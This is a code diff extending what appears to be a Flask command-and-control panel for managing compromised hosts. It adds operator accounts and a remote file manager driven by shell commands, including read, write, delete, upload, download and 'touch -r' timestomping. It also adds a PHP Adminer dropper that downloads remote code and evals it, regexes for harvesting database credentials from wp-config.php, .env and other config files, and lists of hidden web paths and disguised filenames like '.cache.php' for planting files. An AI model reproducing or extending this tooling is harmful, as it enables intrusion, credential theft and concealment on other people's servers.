@@ -26,7 +26,7 @@ import string
 import random
 from datetime import datetime, timedelta
 from functools import wraps
-from flask import Flask, render_template, jsonify, request, Response, send_file, redirect, url_for, session
+from flask import Flask, render_template, jsonify, request, Response, send_file, redirect, url_for, session, make_response
 
 from crypto import SecureChannel, generate_secret, verify_secret
 from webhooks import WebhookNotifier
@@ -49,7 +49,8 @@ AUTH_KEY = os.environ.get('AUTH_KEY', '')
 
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
 app.config['SESSION_COOKIE_HTTPONLY'] = True
-app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+app.config['SESSION_COOKIE_SAMESITE'] = 'None'
+app.config['SESSION_COOKIE_SECURE'] = True
 
 def generate_random_path(length=26):
     chars = string.ascii_lowercase + string.digits
@@ -107,6 +108,131 @@ command_results = {}
 pty_sessions = {}
 pty_sessions_lock = threading.Lock()
 notifier = WebhookNotifier()
+
+# User management
+USERS_FILE = os.path.join(os.path.dirname(__file__), 'users.json')
+users = {}  # {user_id: user_data}
+users_lock = threading.Lock()
+
+def generate_user_id():
+    return secrets.token_hex(8)
+
+def load_users():
+    global users
+    try:
+        if os.path.exists(USERS_FILE):
+            with open(USERS_FILE, 'r') as f:
+                users = json.load(f)
+    except:
+        users = {}
+
+def save_users():
+    with users_lock:
+        try:
+            with open(USERS_FILE, 'w') as f:
+                json.dump(users, f, indent=2)
+        except:
+            pass
+
+def get_used_ports():
+    """Get list of ports already used by users"""
+    used = set()
+    with users_lock:
+        for u in users.values():
+            if 'port' in u:
+                used.add(u['port'])
+    return used
+
+def generate_user_port():
+    """Generate random port 5000-9000 not already used"""
+    used = get_used_ports()
+    available = [p for p in range(5000, 9001) if p not in used and p != 5000 and p != 6318]
+    return random.choice(available) if available else random.randint(5001, 9000)
+
+def create_user(name):
+    """Create a new user with unique paths, port and key"""
+    user_id = generate_user_id()
+    user = {
+        'id': user_id,
+        'name': name,
+        'key': ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*()_+-=[]{}|;:,.<>?', k=40)),
+        'port': generate_user_port(),
+        'stealth_path': generate_random_path(9),
+        'persist_path': generate_random_path(9),
+        'shared_hosts': [],
+        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    }
+    with users_lock:
+        users[user_id] = user
+    save_users()
+    return user
+
+def get_user(user_id):
+    with users_lock:
+        return users.get(user_id)
+
+def delete_user(user_id):
+    with users_lock:
+        if user_id in users:
+            del users[user_id]
+    save_users()
+
+def is_admin_session():
+    """Check if current session is admin (main profile)"""
+    # If no AUTH_KEY, everyone is admin (no auth required)
+    if not AUTH_KEY:
+        return True
+    return session.get('is_admin', False)
+
+def get_current_user_id():
+    """Get current user ID being viewed (for filtering)"""
+    return session.get('view_as_user')
+
+def get_viewing_user():
+    """Get user object being viewed"""
+    view_id = session.get('view_as_user')
+    if view_id:
+        return get_user(view_id)
+    return None
+
+def get_accessible_clients(user_id=None):
+    """Get list of client_ids accessible to user"""
+    # Use view_as_user if set, otherwise the provided user_id
+    view_id = session.get('view_as_user') if user_id is None else user_id
+    if view_id is None:
+        return None  # Admin sees all when not viewing as user
+    user = get_user(view_id)
+    if user:
+        return set(user.get('shared_hosts', []))
+    return set()
+
+def share_host(user_id, client_id):
+    """Share a host with a user"""
+    with users_lock:
+        if user_id in users:
+            if client_id not in users[user_id]['shared_hosts']:
+                users[user_id]['shared_hosts'].append(client_id)
+    save_users()
+
+def unshare_host(user_id, client_id):
+    """Remove host share from user"""
+    with users_lock:
+        if user_id in users:
+            if client_id in users[user_id]['shared_hosts']:
+                users[user_id]['shared_hosts'].remove(client_id)
+    save_users()
+
+def get_host_shares(client_id):
+    """Get list of users who have access to this host"""
+    shares = []
+    with users_lock:
+        for uid, user in users.items():
+            if client_id in user.get('shared_hosts', []):
+                shares.append({'id': uid, 'name': user['name']})
+    return shares
+
+# Load users on startup
+load_users()
 
 
 class Client:
@@ -276,6 +402,12 @@ def client_reader_thread(client, client_id):
                             socketio.emit('pty_closed', {'session_id': session_id, 'code': code}, to=ws_sid)
                         del pty_sessions[session_id]
                 client.pty_sessions.discard(session_id)
+            
+            elif msg_type == 'file_op_result':
+                op_id = msg.get('op_id')
+                if op_id:
+                    with file_op_lock:
+                        file_op_results[op_id] = msg
             
             elif msg.get('status') in ['sleeping', 'going_dark', 'destroying', 'disconnected']:
                 client.online = False
@@ -711,10 +843,23 @@ def root_redirect():
 @require_auth
 def api_clients():
     """Return hosts grouped by hostname, each with available channels"""
+    # Support view_as query parameter for client-side user switching
+    view_as = request.args.get('view_as')
+    if view_as and is_admin_session():
+        current_user = view_as
+    else:
+        current_user = get_current_user_id()
+    is_admin = is_admin_session()
+    accessible = get_accessible_clients(current_user)
+    
     with clients_lock:
         # Group clients by IP+hostname
         hosts = {}
         for c in clients.values():
+            # Filter by user access
+            if accessible is not None and c.id not in accessible:
+                continue
+            
             host_key = f"{c.addr[0]}:{c.hostname}"
             if host_key not in hosts:
                 hosts[host_key] = {
@@ -749,6 +894,10 @@ def api_clients():
             # Get most recent last_seen
             best_channel = max(channels.values(), key=lambda x: x['last_seen'])
             
+            # Get shares info for admin
+            first_channel_id = list(channels.values())[0]['id']
+            shares = get_host_shares(first_channel_id) if is_admin else []
+            
             result.append({
                 'host_key': host_key,
                 'hostname': host_data['hostname'],
@@ -761,7 +910,8 @@ def api_clients():
                 'last_seen_ago': best_channel['last_seen_ago'],
                 'os': best_channel['os'],
                 'user': best_channel['user'],
-                'arch': best_channel['arch']
+                'arch': best_channel['arch'],
+                'shared_with': shares
             })
         
         return jsonify(sorted(result, key=lambda x: (not x['overall_online'], x['overall_status'] != 'beacon', x['hostname'])))
@@ -883,6 +1033,112 @@ def api_destroy(client_id):
             wake_queue[client_id] = [{'type': 'self_destruct'}]
         print(f"[!] Client removed, destroy queued: {client_id}")
         return jsonify({'status': 'queued', 'message': 'Removed from panel. Destroy queued for next beacon.'})
+
+
+# User Management API
+@app.route('/api/users')
+@require_auth
+def api_users():
+    """List all users (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    with users_lock:
+        return jsonify(list(users.values()))
+
+
+@app.route('/api/users', methods=['POST'])
+@require_auth
+def api_create_user():
+    """Create a new user (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    data = request.json or {}
+    name = data.get('name', f'User_{len(users)+1}')
+    user = create_user(name)
+    return jsonify(user)
+
+
+@app.route('/api/users/<user_id>', methods=['DELETE'])
+@require_auth
+def api_delete_user(user_id):
+    """Delete a user (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    delete_user(user_id)
+    return jsonify({'status': 'deleted'})
+
+
+@app.route('/api/users/<user_id>', methods=['PUT'])
+@require_auth
+def api_update_user(user_id):
+    """Update a user (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    data = request.json or {}
+    with users_lock:
+        if user_id not in users:
+            return jsonify({'error': 'User not found'}), 404
+        if 'name' in data:
+            users[user_id]['name'] = data['name']
+        save_users()
+    return jsonify({'status': 'updated'})
+
+
+@app.route('/api/users/<user_id>/share', methods=['POST'])
+@require_auth
+def api_share_host(user_id):
+    """Share a host with user (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    data = request.json or {}
+    client_id = data.get('client_id')
+    if not client_id:
+        return jsonify({'error': 'client_id required'}), 400
+    share_host(user_id, client_id)
+    return jsonify({'status': 'shared'})
+
+
+@app.route('/api/users/<user_id>/unshare', methods=['POST'])
+@require_auth
+def api_unshare_host(user_id):
+    """Remove host share from user (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    data = request.json or {}
+    client_id = data.get('client_id')
+    if not client_id:
+        return jsonify({'error': 'client_id required'}), 400
+    unshare_host(user_id, client_id)
+    return jsonify({'status': 'unshared'})
+
+
+@app.route('/api/session')
+@require_auth
+def api_session():
+    """Get current session info"""
+    view_user = get_viewing_user()
+    return jsonify({
+        'is_admin': is_admin_session(),
+        'view_as_user': session.get('view_as_user'),
+        'viewing_user': view_user
+    })
+
+
+@app.route('/api/switch_user', methods=['POST'])
+@require_auth
+def api_switch_user():
+    """Switch to a different user view (admin only)"""
+    if not is_admin_session():
+        return jsonify({'error': 'Admin only'}), 403
+    data = request.json or {}
+    user_id = data.get('user_id')
+    if user_id == 'admin' or user_id is None:
+        session.pop('view_as_user', None)
+    else:
+        if user_id not in users:
+            return jsonify({'error': 'User not found'}), 404
+        session['view_as_user'] = user_id
+    return jsonify({'status': 'switched', 'view_as_user': session.get('view_as_user')})
 
 
 @app.route('/api/clients/<client_id>/exec', methods=['POST'])
@@ -1021,6 +1277,1078 @@ def api_broadcast():
     return jsonify({'status': 'ok', 'sent': sent, 'queued': queued})
 
 
+file_op_results = {}
+file_op_lock = threading.Lock()
+
+def wait_for_exec_result(client_id, timeout=30):
+    """Wait for exec command result"""
+    start = time.time()
+    while time.time() - start < timeout:
+        if client_id in command_results and len(command_results[client_id]) > 0:
+            return command_results[client_id].pop()['result']
+        time.sleep(0.1)
+    return None
+
+def wait_for_file_op(client, op_id, timeout=30):
+    """Wait for file operation result with timeout"""
+    start = time.time()
+    while time.time() - start < timeout:
+        with file_op_lock:
+            if op_id in file_op_results:
+                result = file_op_results.pop(op_id)
+                return result
+        time.sleep(0.1)
+    return {'error': 'Operation timed out'}
+
+
+@app.route('/api/clients/<client_id>/files/list', methods=['POST'])
+@require_auth
+def api_files_list(client_id):
+    """List files in directory using exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '/') if request.json else '/'
+        path = path.replace("'", "'\\''")
+        
+        cmd = f"for f in '{path}'/* '{path}'/.*; do [ -e \"$f\" ] && stat -c '%F|%n|%s|%A|%U|%Y' \"$f\" 2>/dev/null; done || ls -la '{path}' 2>/dev/null"
+        
+        op_id = str(uuid.uuid4())[:8]
+        client.pending_exec[client.exec_counter] = cmd
+        client.exec_counter += 1
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    files = []
+    stdout = result.get('stdout', '')
+    from datetime import datetime
+    
+    for line in stdout.strip().split('\n'):
+        if not line:
+            continue
+        
+        if '|' in line and not line.startswith('total'):
+            parts = line.split('|')
+            if len(parts) >= 6:
+                ftype = parts[0].strip()
+                fpath = parts[1].strip()
+                fname = fpath.split('/')[-1]
+                
+                if fname in ('.', '..'):
+                    continue
+                
+                size_str = parts[2].strip()
+                perms = parts[3].strip()
+                owner = parts[4].strip()
+                mtime_ts = parts[5].strip()
+                
+                is_dir = 'directory' in ftype.lower() or 'dir' in ftype.lower() or perms.startswith('d')
+                
+                try:
+                    ts = int(mtime_ts)
+                    mtime = datetime.fromtimestamp(ts).strftime('%d-%b-%Y %H:%M:%S')
+                except:
+                    mtime = mtime_ts
+                
+                try:
+                    file_size = int(size_str)
+                except:
+                    file_size = 0
+                
+                files.append({
+                    'is_dir': is_dir,
+                    'name': fname,
+                    'size': file_size,
+                    'perms': perms[1:] if len(perms) > 1 and perms[0] in 'dl-' else perms,
+                    'owner': owner,
+                    'mtime': mtime
+                })
+        
+        elif not line.startswith('total') and len(line.split()) >= 9:
+            parts = line.split()
+            perms = parts[0]
+            owner = parts[2]
+            size = parts[4]
+            name_parts = parts[8:]
+            name = ' '.join(name_parts)
+            if ' -> ' in name:
+                name = name.split(' -> ')[0]
+            if name in ('.', '..'):
+                continue
+            is_dir = perms.startswith('d')
+            raw_mtime = f"{parts[5]} {parts[6]} {parts[7]}"
+            try:
+                if ':' in parts[7]:
+                    dt = datetime.strptime(raw_mtime, '%b %d %H:%M')
+                    dt = dt.replace(year=datetime.now().year)
+                else:
+                    dt = datetime.strptime(raw_mtime, '%b %d %Y')
+                mtime = dt.strftime('%d-%b-%Y %H:%M:%S')
+            except:
+                mtime = raw_mtime
+            try:
+                file_size = int(size)
+            except:
+                file_size = 0
+            
+            files.append({
+                'is_dir': is_dir,
+                'name': name,
+                'size': file_size,
+                'perms': perms[1:] if len(perms) > 1 else perms,
+                'owner': owner,
+                'mtime': mtime
+            })
+    
+    return jsonify({'path': path, 'files': files})
+
+
+@app.route('/api/clients/<client_id>/files/read', methods=['POST'])
+@require_auth
+def api_files_read(client_id):
+    """Read file contents via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path = path.replace("'", "'\\''")
+        cmd = f"cat '{path}' 2>&1"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    content = result.get('stdout', '') or result.get('stderr', '')
+    return jsonify({'content': content})
+
+
+@app.route('/api/clients/<client_id>/files/write', methods=['POST'])
+@require_auth
+def api_files_write(client_id):
+    """Write/create file via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        content = request.json.get('content', '') if request.json else ''
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path = path.replace("'", "'\\''")
+        import base64
+        content_b64 = base64.b64encode(content.encode()).decode()
+        cmd = f"echo '{content_b64}' | base64 -d > '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Write failed'})
+
+
+@app.route('/api/clients/<client_id>/files/delete', methods=['POST'])
+@require_auth
+def api_files_delete(client_id):
+    """Delete file or directory via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path = path.replace("'", "'\\''")
+        cmd = f"rm -rf '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Delete failed'})
+
+
+@app.route('/api/clients/<client_id>/files/mkdir', methods=['POST'])
+@require_auth
+def api_files_mkdir(client_id):
+    """Create directory via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path = path.replace("'", "'\\''")
+        cmd = f"mkdir -p '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Mkdir failed'})
+
+
+@app.route('/api/clients/<client_id>/files/rename', methods=['POST'])
+@require_auth
+def api_files_rename(client_id):
+    """Rename/move file via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        old_path = request.json.get('old_path', '') if request.json else ''
+        new_path = request.json.get('new_path', '') if request.json else ''
+        if not old_path or not new_path:
+            return jsonify({'error': 'Both old_path and new_path required'}), 400
+        
+        old_path = old_path.replace("'", "'\\''")
+        new_path = new_path.replace("'", "'\\''")
+        cmd = f"mv '{old_path}' '{new_path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Rename failed'})
+
+
+@app.route('/api/clients/<client_id>/files/chmod', methods=['POST'])
+@require_auth
+def api_files_chmod(client_id):
+    """Change file permissions via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        mode = request.json.get('mode', '') if request.json else ''
+        if not path or not mode:
+            return jsonify({'error': 'Path and mode required'}), 400
+        
+        path = path.replace("'", "'\\''")
+        mode = mode.replace("'", "")
+        cmd = f"chmod {mode} '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Chmod failed'})
+
+
+@app.route('/api/clients/<client_id>/files/copy', methods=['POST'])
+@require_auth
+def api_files_copy(client_id):
+    """Copy file or directory via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        src = request.json.get('src', '') if request.json else ''
+        dst = request.json.get('dst', '') if request.json else ''
+        if not src or not dst:
+            return jsonify({'error': 'Source and destination required'}), 400
+        
+        src = src.replace("'", "'\\''")
+        dst = dst.replace("'", "'\\''")
+        cmd = f"cp -r '{src}' '{dst}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=30)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Copy failed'})
+
+
+@app.route('/api/clients/<client_id>/files/move', methods=['POST'])
+@require_auth
+def api_files_move(client_id):
+    """Move file or directory via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        src = request.json.get('src', '') if request.json else ''
+        dst = request.json.get('dst', '') if request.json else ''
+        if not src or not dst:
+            return jsonify({'error': 'Source and destination required'}), 400
+        
+        src = src.replace("'", "'\\''")
+        dst = dst.replace("'", "'\\''")
+        cmd = f"mv '{src}' '{dst}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=30)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Move failed'})
+
+
+@app.route('/api/clients/<client_id>/files/download', methods=['POST'])
+@require_auth
+def api_files_download(client_id):
+    """Download file from agent via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path_esc = path.replace("'", "'\\''")
+        cmd = f"base64 '{path_esc}' 2>&1"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=60)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if not stdout or 'No such file' in stdout:
+        return jsonify({'error': stdout or 'File not found'})
+    
+    import base64
+    from io import BytesIO
+    try:
+        content = base64.b64decode(stdout.strip())
+    except:
+        return jsonify({'error': 'Failed to decode file'})
+    
+    filename = os.path.basename(path)
+    return send_file(
+        BytesIO(content),
+        as_attachment=True,
+        download_name=filename,
+        mimetype='application/octet-stream'
+    )
+
+
+@app.route('/api/clients/<client_id>/files/upload', methods=['POST'])
+@require_auth
+def api_files_upload(client_id):
+    """Upload file to agent via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        if 'file' not in request.files:
+            return jsonify({'error': 'No file provided'}), 400
+        
+        file = request.files['file']
+        path = request.form.get('path', '/tmp/')
+        
+        import base64
+        content = base64.b64encode(file.read()).decode()
+        filename = file.filename
+        full_path = os.path.join(path, filename).replace("'", "'\\''")
+        
+        cmd = f"echo '{content}' | base64 -d > '{full_path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=60)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Upload failed'})
+
+
+@app.route('/api/clients/<client_id>/files/archive', methods=['POST'])
+@require_auth
+def api_files_archive(client_id):
+    """Create/extract archive via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        action = request.json.get('action', 'create') if request.json else 'create'
+        path = request.json.get('path', '') if request.json else ''
+        archive_path = request.json.get('archive_path', '') if request.json else ''
+        
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path = path.replace("'", "'\\''")
+        archive_path = archive_path.replace("'", "'\\''")
+        
+        if action == 'create':
+            cmd = f"tar -czf '{archive_path}' -C $(dirname '{path}') $(basename '{path}') 2>&1 && echo 'OK' || echo 'FAIL'"
+        else:
+            cmd = f"tar -xzf '{path}' -C '{archive_path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=120)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Archive operation failed'})
+
+
+@app.route('/api/clients/<client_id>/files/touch', methods=['POST'])
+@require_auth
+def api_files_touch(client_id):
+    """Touch file with optional donor timestamp via exec"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        path = request.json.get('path', '') if request.json else ''
+        donor = request.json.get('donor', '') if request.json else ''
+        
+        if not path:
+            return jsonify({'error': 'No path specified'}), 400
+        
+        path = path.replace("'", "'\\''")
+        
+        if donor:
+            donor = donor.replace("'", "'\\''")
+            cmd = f"touch -r '{donor}' '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        else:
+            cmd = f"touch '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
+        
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'OK' in stdout:
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Touch failed'})
+
+
+adminer_installations = {}
+client_paths = {}  # {client_id: {'terminal_cwd': '/path', 'fm_path': '/path'}}
+
+ADMINER_PHP = '''<?php
+function adminer_object(){class AdminerSoftware extends Adminer{function name(){return"";}function credentials(){return array($_GET["server"]?:getenv("DB_HOST")?:"localhost",$_GET["username"]?:getenv("DB_USER")?:"root",$_GET["password"]?:getenv("DB_PASS")?:"");}function database(){return $_GET["db"]?:getenv("DB_NAME")?:null;}function loginForm(){return true;}}return new AdminerSoftware;}
+include "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
+'''
+
+ADMINER_STANDALONE = '''<?php
+$_p="4.8.1";if(!function_exists("password_hash")){function password_hash($p,$a){return md5($p);}}
+@include_once("./adminer-{$_p}.php");if(!class_exists("Adminer")){$c=@file_get_contents("https://github.com/vrana/adminer/releases/download/v{$_p}/adminer-{$_p}.php");if($c){eval("?>".substr($c,5));}}
+'''
+
+DB_CONFIG_PATTERNS = [
+    {'pattern': 'wp-config.php', 'type': 'WordPress', 'regex': r"define\s*\(\s*['\"]DB_(NAME|USER|PASSWORD|HOST)['\"]\s*,\s*['\"]([^'\"]+)['\"]"},
+    {'pattern': 'configuration.php', 'type': 'Joomla', 'regex': r"\$(?:db|user|password|host)\s*=\s*['\"]([^'\"]+)['\"]"},
+    {'pattern': 'config.php', 'type': 'Generic', 'regex': r"['\"](?:db|database|user|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
+    {'pattern': '.env', 'type': 'Laravel/Env', 'regex': r"DB_(?:DATABASE|USERNAME|PASSWORD|HOST)=(.+)"},
+    {'pattern': 'settings.php', 'type': 'Drupal', 'regex': r"['\"](?:database|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
+    {'pattern': 'LocalConfiguration.php', 'type': 'TYPO3', 'regex': r"['\"](?:dbname|user|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
+    {'pattern': 'config/database.php', 'type': 'Laravel', 'regex': r"['\"](?:database|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
+    {'pattern': 'app/etc/env.php', 'type': 'Magento', 'regex': r"['\"](?:dbname|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
+    {'pattern': 'sites/default/settings.php', 'type': 'Drupal', 'regex': r"['\"](?:database|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
+]
+
+HIDDEN_PATHS = [
+    '/var/www/html/.cache',
+    '/var/www/.tmp',
+    '/tmp/.cache',
+    '/home/{user}/public_html/.well-known',
+    '/home/{user}/public_html/assets/.cache',
+    '/home/{user}/public_html/wp-content/cache',
+    '/home/{user}/public_html/wp-includes/.cache',
+    '/home/{user}/public_html/includes/.cache',
+]
+
+HIDDEN_FILENAMES = ['.cache.php', '.session.php', '.tmp.php', 'error_log.php', '.htaccess.php', 'timthumb.php']
+
+
+def build_adminer_url(path, hostname, ip):
+    """Build public URL for Adminer based on path and hostname/IP"""
+    # Convert filesystem path to web path
+    web_path = path
+    web_roots = ['/var/www/html', '/var/www']
+    for root in web_roots:
+        if path.startswith(root):
+            web_path = path.replace(root, '', 1)
+            break
+    
+    # Handle cPanel public_html
+    if '/public_html' in path:
+        parts = path.split('/public_html')
+        if len(parts) > 1:
+            web_path = parts[1]
+    
+    # Strip common deployment directories (Capistrano/Deployer patterns)
+    # /current/, /releases/*, /shared/ are internal deployment paths
+    deploy_prefixes = ['/current/', '/releases/', '/shared/']
+    for prefix in deploy_prefixes:
+        if web_path.startswith(prefix):
+            web_path = web_path[len(prefix)-1:]  # Keep the leading /
+            break
+    
+    # Pick best hostname - prefer actual domain over hostname
+    domain = hostname
+    if domain and '.' in domain:
+        # Strip common subdomain prefixes
+        if domain.startswith('fe1.') or domain.startswith('fe2.') or domain.startswith('www.'):
+            domain = '.'.join(domain.split('.')[1:])
+    
+    if domain:
+        return f'http://{domain}{web_path}'
+    elif ip:
+        return f'http://{ip}{web_path}'
+    return None
+
+
+def get_adminer_url(client_id, path):
+    """Build public URL for Adminer based on path and client info"""
+    try:
+        with clients_lock:
+            if client_id not in clients:
+                return None
+            client = clients[client_id]
+            sys_info = getattr(client, 'system_info', {}) or {}
+            hostname = sys_info.get('hostname', '')
+            ip = sys_info.get('ip', '') or getattr(client, 'ip', '')
+    except:
+        return None
+    
+    return build_adminer_url(path, hostname, ip)
+
+
+@app.route('/api/clients/<client_id>/adminer/status')
+@require_auth
+def api_adminer_status(client_id):
+    """Check if Adminer is installed - verifies file exists on target"""
+    stored_path = adminer_installations.get(client_id)
+    if not stored_path:
+        return jsonify({'installed': False})
+    
+    is_online = False
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'installed': False})
+        client = clients[client_id]
+        is_online = client.online
+        if is_online:
+            path = stored_path.replace("'", "'\\''")
+            cmd = f"test -f '{path}' && echo 'EXISTS' || echo 'MISSING'"
+            client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    if not is_online:
+        url = get_adminer_url(client_id, stored_path)
+        return jsonify({'installed': True, 'path': stored_path, 'verified': False, 'url': url})
+    
+    result = wait_for_exec_result(client_id, timeout=10)
+    if result is None:
+        url = get_adminer_url(client_id, stored_path)
+        return jsonify({'installed': True, 'path': stored_path, 'verified': False, 'url': url})
+    
+    stdout = result.get('stdout', '')
